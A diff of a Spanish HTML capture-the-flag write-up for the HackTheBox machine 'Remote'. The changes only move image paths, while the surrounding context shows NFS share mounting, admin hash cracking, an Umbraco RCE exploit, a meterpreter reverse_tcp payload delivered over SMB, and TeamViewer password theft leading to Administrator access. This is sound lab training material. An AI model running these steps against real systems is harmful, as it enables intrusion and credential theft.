@@ -4,7 +4,7 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="/assets/css/style.css?v=37e048dc9df4d22b2eb082f4f8d168f1fccf0fde">
+    <link rel="stylesheet" href="/assets/css/style.css?v=2343efc25a1674883624591a2c0eaceb4895331c">
     <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
 
 <!-- Setup theme-color -->
@@ -70,11 +70,11 @@ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt"
 
 <p>Y nos encontrará un montón de puertos abiertos, vemos 2 que nos interesan a primera vista.</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203203247.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203203247.png" alt="image" /></p>
 
 <p>Si probamos a entrar en ftp como Anonymous no nos encuentra nada dentro de ftp:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203203401.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203203401.png" alt="image" /></p>
 
 <p>Vamos a entrar en el puerto 80 (la web), inspeccionamos un poco pero no vemos nada interesante, vamos a hacer un wfuzz para encontrar subdirectorios:</p>
 
@@ -85,11 +85,11 @@ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</
 
 <p>Con estos parámetros nos encuentra un montón de subdirectorios, pero si inspeccionamos un poco vemos que nos aparece uno que se llama “install”, que si nos metemos desde la web nos hace un redirect a esta página:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203203911.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203203911.png" alt="image" /></p>
 
 <p>Una vez en esta página vemos que hay un panel de login, pero no parece que haya forma de entrar de momento. Si <strong>volvemos sobre nuestros pasos</strong> y nos vamos al escaneo de nmap que hicimos antes nos damos cuenta que el siguiente puerto de nfs está abierto:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203204430.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203204430.png" alt="image" /></p>
 
 <p>En este puerto se están emitiendo una ubicación por la red (una montura), con el comando</p>
 
@@ -100,7 +100,7 @@ showmount <span class="nt">-e</span> <span class="s2">"10.10.10.180"</span>
 
 <p>podemos ver las monturas que está emitiendo esa ip:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203204727.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203204727.png" alt="image" /></p>
 
 <p>Aunque también podemos hacerlo con nmap mediante el comando</p>
 
@@ -109,7 +109,7 @@ nmap <span class="nt">-p</span> 111 <span class="nt">--script</span><span class=
 
 </code></pre></div></div>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203204842.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203204842.png" alt="image" /></p>
 
 <p>Una vez en este punto, podemos montar en local esa montura con el comando</p>
 
@@ -118,7 +118,7 @@ mount <span class="nt">-t</span> nfs 10.10.10.180:/site_backups /mnt/
 
 </code></pre></div></div>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203205218.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203205218.png" alt="image" /></p>
 
 <p>Si vamos al directorio App_Data vemos que hay un archivo .sdf llamado <em>Umbraco.sdf</em>, donde vienen datos en binario. Hay mucha información, así que vamos a poner el comando</p>
 
@@ -129,19 +129,19 @@ mount <span class="nt">-t</span> nfs 10.10.10.180:/site_backups /mnt/
 
 <p>para que nos ponga en pantalla solo las primeras líneas de este archivo, en las que vemos un hash de la contraseña de admin:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203205630.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203205630.png" alt="image" /></p>
 
 <p>Si nos vamos a la web de https://crackstation.net la crackeamos fácil:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203205736.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203205736.png" alt="image" /></p>
 
 <p>También tenemos el usuario de la web del admin, el login donde pedía un correo:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203205810.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203205810.png" alt="image" /></p>
 
 <p>Si nos vamos a la web y probamos con estas credenciales entramos a la web, que si nos vamos a la esquina de arriba a la izquierda, donde nuestro usuario admin, tendríamos la versión de <em>Umbraco</em>:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203210018.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203210018.png" alt="image" /></p>
 
 <p>Si buscamos un exploit por GitHub, nos encontramos con la web https://github.com/Jonoans/Umbraco-RCE/, donde hay que clonar el repositorio. Una vez clonado e instalados los requirements, ejecutamos el ejecutable .py (exploit.py) de la siguiente manera</p>
 
@@ -152,7 +152,7 @@ python3 exploit.py <span class="nt">-u</span> admin@htb.local <span class="nt">-
 
 <p>Una vez puesto este comando, nos da una shell directamente:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203213041.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203213041.png" alt="image" /></p>
 
 <p>El problema es que si probamos a poner comandos básicos no funciona bien.</p>
 
@@ -195,7 +195,7 @@ impacket-smbserver samucrow <span class="si">$(</span><span class="nb">pwd</span
 
 <p>Una vez tenemos el virus dentro del sistema víctima, nos vamos a metasploit usando msfconsole para usar multi/handler:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203215628.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203215628.png" alt="image" /></p>
 
 <p>con el comando</p>
 
@@ -206,19 +206,19 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 
 <p>vamos a definir el mismo payload que pusimos en el .exe que copiamos en la máquina víctima para conseguir una meterpreter. Vamos a poner los datos que nos piden de nuestra ip, tanto en el payload como en el multi/handler, y vamos a poner también el puerto 5555 en ambos, que es el que especificamos anteriormente en el payload también:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203220118.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203220118.png" alt="image" /></p>
 
 <p>ponemos el comando run y ejecutamos el virus.exe en la máquina víctima poniendo <code class="language-plaintext highlighter-rouge">./virus.exe</code>, lo que nos dará una meterpreter:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203220355.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203220355.png" alt="image" /></p>
 
 <p>Una vez en la meterpreter, ponemos <code class="language-plaintext highlighter-rouge">shell</code> y nos dará una shell de windows:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203221312.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203221312.png" alt="image" /></p>
 
 <p>ahora iremos a C:\Users\Public\ para ver la flag de user:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203221719.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203221719.png" alt="image" /></p>
 
 <h1 id="escalada-1">Escalada 1</h1>
 
@@ -231,15 +231,15 @@ search teamviewer
 
 </code></pre>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203223006.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203223006.png" alt="image" /></p>
 
 <p>elegimos al opción “1” y si ponemos <code class="language-plaintext highlighter-rouge">show options</code> vemos que nos pide un SESSION, por lo que listamos las sesiones activas con <code class="language-plaintext highlighter-rouge">session -l</code>:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203223209.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203223209.png" alt="image" /></p>
 
 <p>elegimos la opción “1” y ponemos <code class="language-plaintext highlighter-rouge">run</code> y nos encontrará la contraseña de TeamViewer:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203223318.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203223318.png" alt="image" /></p>
 
 <p>Para deducir de que usuario es esta contraseña, vamos otra vez a la shell de meterpreter con <code class="language-plaintext highlighter-rouge">session -i 1</code> y vamos a la ruta “<em>C:\users</em>”, donde veremos  que solo existe el usuario <strong>Administrador</strong>.</p>
 
@@ -252,13 +252,13 @@ evil-winrm <span class="nt">-i</span> 10.10.10.180 <span class="nt">-u</span> <s
 
 <p>Ahora nos iríamos al escritorio del Administrador y tendremos la flag de root:</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203224126.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203224126.png" alt="image" /></p>
 
 <h1 id="escalada-2-no-funcional">Escalada 2 (NO FUNCIONAL)</h1>
 
 <p>Si nos vamos a la consola de metasploit, podemos poner el comando <code class="language-plaintext highlighter-rouge">search local_exploit_suggester</code> y <code class="language-plaintext highlighter-rouge">use 0</code> para usar el exploit suggester, una vez hecho esto, ponemos <code class="language-plaintext highlighter-rouge">set SESSION 1</code> y <code class="language-plaintext highlighter-rouge">run</code>, así nos buscará posibles formas de conseguir privilegios de Administrador.</p>
 
-<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203224957.png" alt="image" /></p>
+<p><img src="/m%C3%A1quinas/zimages/Pasted_image_20231203224957.png" alt="image" /></p>
 
 <p>Probamos con todos los posibles exploits pero ninguno funciona</p>
 
